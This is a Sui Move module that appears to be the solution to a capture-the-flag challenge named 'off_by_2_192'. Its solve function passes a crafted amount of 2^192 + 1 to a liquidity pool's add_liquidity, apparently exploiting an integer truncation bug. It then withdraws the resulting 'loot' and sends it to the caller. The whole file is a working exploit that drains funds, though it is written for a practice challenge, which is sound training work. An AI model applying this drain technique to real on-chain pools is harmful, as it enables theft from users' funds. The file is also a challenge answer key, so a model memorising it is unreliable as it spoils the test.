module solution::solve;

use off_by_2_192::pool::{Self, Pool};
use sui::sui::SUI;

public fun solve(pool: &mut Pool, mut payment: sui::coin::Coin<SUI>, ctx: &mut TxContext) {
    let lp = pool::add_liquidity(pool, (1u256 << 192) + 1, &mut payment, ctx);
    let loot = pool::remove_liquidity(pool, lp, ctx);
    let sender = ctx.sender();
    transfer::public_transfer(loot, sender);
    transfer::public_transfer(payment, sender);
}
